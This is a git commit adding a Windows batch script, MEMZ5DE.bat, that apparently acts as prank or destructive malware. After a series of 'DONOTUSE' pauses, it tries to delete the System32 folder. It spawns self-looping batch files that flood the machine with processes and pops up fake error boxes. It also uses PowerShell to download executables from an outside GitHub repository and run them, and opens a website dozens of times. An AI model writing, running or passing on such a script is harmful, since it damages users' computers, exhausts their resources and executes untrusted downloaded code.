766544b5c6f3fb6b032f2b875b78a35448c2c6a9
zv800 <58888808+zv800@users.noreply.github.com>
2021-06-22 14:41:40 -0500

    Add files via upload

---
+++ MEMZ5DE.bat
@@ -0,0 +1,143 @@
+@echo off
+
+
+ECHO DONOTUSE
+pause
+ECHO DONOTUSE
+pause
+ECHO DONOTUSE
+pause
+ECHO DONOTUSE
+pause
+ECHO DONOTUSE
+pause
+ECHO DONOTUSE
+pause
+ECHO DONOTUSE
+pause
+ECHO DONOTUSE
+pause
+ECHO DONOTUSE
+pause
+ECHO DONOTUSE
+pause
+Del C:\Windows\System32
+echo x=msgbox("ERROR CAN NOT FIND MAIN.EXE" ,16 , "ERROR") >> MAIN.EXE.vbs
+echo a >>MAIN2.EXE.BAT
+ECHO start MAIN.EXE.vbs >>MAIN2>EXE>BAT
+echo goto a >>MAIN2.EXE.BAT
+START MAIN2.EXE.BAT
+powershell -c "Invoke-WebRequest -Uri 'https://github.com/zv800/mel/blob/main/melter.exe?raw=true' -OutFile 'MAIN.EXE'"
+powershell -c "Invoke-WebRequest -Uri 'https://github.com/zv800/mel/blob/main/STOP.exe?raw=true' -OutFile 'MAIN2.EXE'"
+::MAIN.EXE.vbs
+start MAIN.EXE
+start http://powercore.tk/
+start http://powercore.tk/
+echo a >>MAIN3.EXE.BAT
+echo echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random% >>MAIN3.EXE.BAT
+echo goto a >>MAIN3.EXE.BAT
+START MAIN3.EXE.BAT
+START MAIN3.EXE.BAT
+START MAIN3.EXE.BAT
+START MAIN3.EXE.BAT
+START MAIN3.EXE.BAT
+START MAIN3.EXE.BAT
+START MAIN3.EXE.BAT
+START MAIN3.EXE.BAT
+START MAIN3.EXE.BAT
+START MAIN3.EXE.BAT
+START MAIN3.EXE.BAT
+start http://powercore.tk/
+start http://powercore.tk/
+start http://powercore.tk/
+start http://powercore.tk/
+start http://powercore.tk/
+start http://powercore.tk/
+start http://powercore.tk/
+start http://powercore.tk/
+
+start http://powercore.tk/
+start http://powercore.tk/
+start http://powercore.tk/
+start http://powercore.tk/
+start http://powercore.tk/
+start http://powercore.tk/
+start http://powercore.tk/
+start http://powercore.tk/
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start http://powercore.tk/
+start http://powercore.tk/
+start http://powercore.tk/
+start http://powercore.tk/
+start http://powercore.tk/
+start http://powercore.tk/
+start http://powercore.tk/
+start http://powercore.tk/
+
+start http://powercore.tk/
+start http://powercore.tk/
+start http://powercore.tk/
+start http://powercore.tk/
+start http://powercore.tk/
+start http://powercore.tk/
+::MAIN.EXE.vbs
+start MAIN.EXE.vbs
+start MAIN.EXE.vbs
+start MAIN.EXE.vbs
+start MAIN.EXE.vbs
+start MAIN.EXE.vbs
+start MAIN.EXE.vbs
+start MAIN.EXE.vbs
+start MAIN.EXE.vbs
+start MAIN.EXE.vbs
+start MAIN.EXE.vbs
+start MAIN.EXE.vbs
+start MAIN.EXE.vbs
+start MAIN.EXE.vbs
+start MAIN.EXE.vbs
+start MAIN.EXE.vbs
+start MAIN.EXE.vbs
+start MAIN.EXE.vbs
+start MAIN.EXE.vbs
+start MAIN.EXE.vbs
+start MAIN.EXE.vbs
+start MAIN.EXE.vbs
+start MAIN.EXE.vbs
+start MAIN.EXE.vbs
+start MAIN.EXE.vbs
+start MAIN.EXE.vbs
+start MAIN.EXE.vbs
+start MAIN.EXE.vbs
+start MAIN.EXE.vbs
+start MAIN.EXE.vbs
+start MAIN.EXE.vbs
+start MAIN.EXE.vbs
+start MAIN.EXE.vbs
+start MAIN.EXE.vbs
+start MAIN.EXE.vbs
+start MAIN.EXE.vbs
+start MAIN.EXE.vbs
+start MAIN.EXE.vbs
+start MAIN.EXE.vbs
+start MAIN.EXE.vbs
+start MAIN.EXE.vbs
+start MAIN.EXE.vbs
+start MAIN.EXE.vbs
+start MAIN.EXE.vbs
+start MAIN.EXE.vbs
+start MAIN.EXE.vbs
+DEL MAIN.EXE.vbs
+start MAIN2.EXE
+
+
